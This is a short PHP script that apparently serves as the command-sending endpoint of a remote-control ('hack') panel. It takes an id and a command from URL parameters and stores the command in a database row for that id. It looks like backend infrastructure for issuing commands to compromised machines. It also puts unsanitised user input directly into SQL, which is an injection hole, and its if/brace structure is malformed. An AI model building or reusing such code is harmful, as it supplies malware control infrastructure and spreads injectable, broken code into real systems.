<?php
	include_once 'sql.php';

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
if( $_GET["id"] || $_GET["command"])
$hek = $_GET["id"];
$command = $_GET["command"];
{
    $sql = "UPDATE hack SET command = '$command' WHERE `id` = '$hek'";
}

if ($conn->query($sql) === TRUE) {
    echo "command send successfully";
} else {
    echo "Error updating record: " . $conn->error;
}

$conn->close();

?>